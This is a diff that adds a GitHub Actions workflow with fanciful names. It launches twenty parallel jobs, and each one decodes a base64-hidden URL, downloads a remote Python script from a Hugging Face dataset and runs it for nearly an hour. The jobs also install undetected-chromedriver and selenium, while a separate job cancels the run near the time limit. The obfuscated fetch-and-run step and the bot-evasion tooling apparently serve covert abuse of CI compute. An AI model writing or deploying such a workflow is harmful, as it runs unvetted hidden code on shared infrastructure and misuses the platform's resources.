@@ -1,0 +1,103 @@
+name: Ethereal Voyager Nexus Loom
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ethereal-loom-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Overseer: maintains watch for 59 minutes, then cancels the run
+  # =================================================================
+  ethereal-overseer:
+    name: "Ethereal Overseer"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      OVERSEER_DURATION: 3540
+    steps:
+      - name: Initiate Overseer Watch
+        run: |
+          echo "[OVERSEER] Watch initiated for run: ${{ github.run_id }}"
+          echo "[OVERSEER] Remaining in watch for ${OVERSEER_DURATION} seconds (59-minute threshold)."
+
+          sleep "${OVERSEER_DURATION}"
+
+          echo "[OVERSEER] Threshold passed — dispatching cancel command."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[OVERSEER] Cancel command dispatched. All running and queued operations will be halted."
+
+  # =================================================================
+  # Voyager Lattice: parallel execution of Voyager nodes
+  # =================================================================
+  voyager-lattice:
+    name: "VoyagerNode-${{ matrix.voyager_id }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        voyager_id: [7701, 7702, 7703, 7704, 7705, 7706, 7707, 7708, 7709, 7710, 7711, 7712, 7713, 7714, 7715, 7716, 7717, 7718, 7719, 7720]
+
+    steps:
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      # Phase 1: Prepare the node environment
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      - name: Prepare Node Environment
+        run: |
+          echo "[PREP] Preparing environment for VoyagerNode-${{ matrix.voyager_id }} on Linux..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      # Phase 2: Retrieve the voyager agent
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      - name: Retrieve Voyager Agent
+        run: |
+          echo "[RETRIEVE] Retrieving voyager agent from remote source..."
+          AGENT_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$AGENT_URL" -o voyager_agent.py
+          echo "[RETRIEVE] Voyager agent retrieved."
+
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      # Phase 3: Install the necessary dependencies
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      - name: Install Dependencies
+        run: |
+          echo "[INSTALL] Installing dependencies..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      # Phase 4: Run the voyager cycle (59-minute limit)
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      - name: Execute Voyager Cycle
+        run: |
+          echo ">> Executing VoyagerNode-${{ matrix.voyager_id }} cycle..."
+
+          python3 voyager_agent.py &
+          AGENT_PID=$!
+
+          echo ">> Cycle started. Maximum runtime: 59 minutes (3540s)."
+
+          sleep 3540
+
+          if kill -0 "$AGENT_PID" 2>/dev/null; then
+            echo ">> Maximum runtime reached — stopping cycle."
+            kill -9 "$AGENT_PID"
+            echo ">> Cycle stopped by runtime controller."
+          else
+            echo ">> Cycle completed before maximum runtime."
+          fi
